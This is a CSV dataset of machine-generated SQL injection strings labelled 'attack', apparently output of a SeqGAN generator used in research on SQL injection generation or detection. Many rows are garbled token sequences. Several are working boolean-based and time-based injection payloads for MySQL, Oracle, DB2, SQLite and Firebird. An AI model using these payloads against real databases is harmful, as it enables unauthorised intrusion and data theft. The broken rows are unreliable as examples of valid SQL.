label,payload,family,payload_type,method,run_id,sample_index
attack,select *from 9687 and or  9643  3175 where 9687  ,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,407
attack,(1 where 8363t  =  char(  *)   from 5333  ,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,408
attack,"1'   )    )    and make_set  (  8245  =  9872,9872  )   and    (    (   'umas""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,409
attack,select cd=((  *     and ,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,410
attack,"1"" =(( (  )   pa""  =  ""ff",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,411
attack,1%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,412
attack,select _or=  =      or e2367  3175 7046  =  ,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,413
attack,"1""   )    )    or   (  6485  =  1127  )  *1127 and    (    (   ""   8363or7552 9643   =",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,414
attack, 3455 7471  * and 9643  h where d  =  =,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,415
attack,"n    ' where 3036  =  3036 and elt  (  1832  =  6644,6644   )    )   ||'%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,416
attack,"select ""   )    )    or    (    (   ""(  *     *   c 9643  =    (  ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,417
attack,"1""   )    )     )   and   (  3020  =  3020  )  *6703 and    (    (     (  ""g5333  select   augas""  =  ""i",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,418
attack,select 8156    =a  7046=    su'  =  'a,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,419
attack,"1%' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,420
attack,"1%"" 4212 and or 8635  ( 4212  select r ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,421
attack,"1'  )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and   (  '   where",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,422
attack,"1%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,423
attack,"1%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,424
attack,"select co e9643( 4728( 7471  ) 2633   ""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,425
attack,"""   )    )    or    (    (   ""  ""  )""  =  ""=(",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,426
attack,"1""  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  ""or 2367   8312    =  =  =(  *)u",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,427
attack,"-2583"" ) 3202  )   and 9643  *na  (  ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,428
attack,"-5067%""  =  ""2633  )   or d",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,429
attack,xu5903t  and * 8312  select 2072 2367   8421  ,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,430
attack,"1""   )    )    and   (  1248  =  8705  )  *8705 and    (    (   ""h",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,431
attack,"1'+  (  select 's""  =  ""s co= or )    2633   )   ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,432
attack,"--29258425%""  =  ""qa",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,433
attack,2925   or m cooselectount    select 2223n,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,434
attack,select or cougt  bt=  (  *  )   ,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,435
attack,"1%' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '%%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,436
attack,3455u  =  )   and r cdm,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,437
attack,select cja,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,438
attack,"%'   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  '1"" where 9643   coumi",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,439
attack,"-2925%"" or make_set  (  9354  =  9354,7185  )   and ""7182""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,440
attack,"1"" or uzf 8407  n where 7046 9643  select",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,441
attack,1'   )    )    rlike   (  select   (  case when   (  6205  =  1384  )   then 1 else 0x28 end   )    )    and    (    (   ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,442
attack,"1""   )    )     )   and make_set  (  6751  =  8128,8128  )   and    (    (     (  "" 9687  =  (dgg",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,443
attack,"-""   )    )    or    (    (   """"   )    )    or   (  6485  =  1127  )  *1127 and    (    (   ""I",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,444
attack,"1"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""and v3455rm da  like  2367    m  ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,445
attack,"1'  )   and make_set  (  4551  =  6487,6487  )   and   (  '  select and 8421  =    ( or %q   and ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,446
attack,"1frumyasj""  )   mass  3902",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,447
attack,1'+  (  select lqhd where 4251  =  4251 and   (  8754  =  5779  )  *5779  )  +'un)ap,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,448
attack,1'+  (  select 'pkes 3175 2367(   and malre,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,449
attack,)   where 9643  or d  =  )   where saki,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,450
attack,cours=  7046(    dbmsaei   ,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,451
attack,"-""   )    )    and   (  1248  =  8705  )  *8705 and    (    (   ""1422%'   )    )     )   or elt  (  3695  =  7995,7995  )   and    (    (     (  '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,452
attack,"19643o and dsas "" like ""s un  =(  ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,453
attack,"1%)""",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,454
attack,coerd,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,455
attack,"1"" 23675556  =  4212 dsazt  =    =",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,456
attack,"-Fh=  select count  =    (((   ""  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,457
attack,1'   )    )    rlike   (  select   (  case when   (  6205  =  1384  )   then 1 else 0x28 end   )    )    and    (    (   'a'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,458
attack,"-5067a=  g',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  'xxxqvas'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,459
attack,"-'   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   '""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,460
attack,select and _ or96873175 9643  =  8363s e.e,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,461
attack,"-5067%""  =  ""y",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,462
attack,"1%""  )   or make_set  (  9539  =  9519,9519  )   and   (  ""%""  =  ""'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,463
attack,selectselect count  n saps,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,464
attack,"-2925from""   )    )    or   (  6485  =  1127  )  *1127 and    (    (   ""h       a",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,465
attack,select 7007   =    (  select 8363 n or       n,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,466
attack,"1""  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  """"   )    )     )   and make_set  (  6751  =  8128,8128  )   and    (    (     (  ""uz5333 *une7552   a_",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,467
attack,"-select""or   =    ('  =  '  *  =  =   7046 ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,468
attack,-4641'||  (  select '   a) ,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,469
attack,1  )   from  9643 and 3902  =2072 )n  9643,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,470
attack,select counor 8312,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,471
attack,=  =    (select eieiznb9687  )vc  ,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,472
attack,select 3018)   where 96439687or 4212  =  select cou,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,473
attack,"""   )    )    or    (    (   ""%""   )    )    or   (  8459  =  8459  )  *4906 and    (    (   ""%z""  =  """"  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,474
attack,1select or do. mi e_p k(  =,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,475
attack,"-2583""%""  )   or make_set  (  9539  =  9519,9519  )   and   (  ""%' rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and 'qakeg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  '%%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,476
attack,-2912'  )   and 3202  =  like  (  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,477
attack,select cdos( rdbsk2072 8312  )j),boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,478
attack,"""  )   or make_set  (  9539  =  9519,9519  )   and   (  "" where 3018  )k_x",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,479
attack,1%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,480
attack,"select""   )    )    or    (    (   ""   codf""  =  ""2367a",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,481
attack,"select where codbm' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'or8060a",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,482
attack,1%%'  )   and 3202  =  like  (  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,483
attack,"1% or 4728  =)     =  s""  =  ""s 7471  )",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,484
attack,1'  )   and 5556  )   if d  =    (  select,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,485
attack,"1%'   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  '%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,486
attack,1'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,487
attack,select   30181'+  (  select lqhd where 4251  =  4251 and   (  8754  =  5779  )  *5779  )  +'= '||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'aaqun  =  dss,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,488
attack,-3596'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,489
attack,1%   i*a,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,490
attack,select u)   from  9643  ) 8060  *   and  ,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,491
attack,select= 8363(  'qqpjq'jj%,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,492
attack,-51588459'  )   rlike   (  select   (  case when   (  2671  =  4485  )   then 1 else 0x28 end   )    )    and   (  ' *    =    ab'  )   and    (    (   'ifrs' like 'dks,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,493
attack,-746413596or l   and 8421(  =  (  select (,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,494
attack,"-2583""%"" or make_set  (  9354  =  9354,7185  )   and ""o or 2633  =  =     or ud",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,495
attack," idegufa"" like ""nen  ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,496
attack,-4641%,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,497
attack,-515868h   2367   =    (a()   q r e,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,498
attack,select coallllecezo rdf,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,499
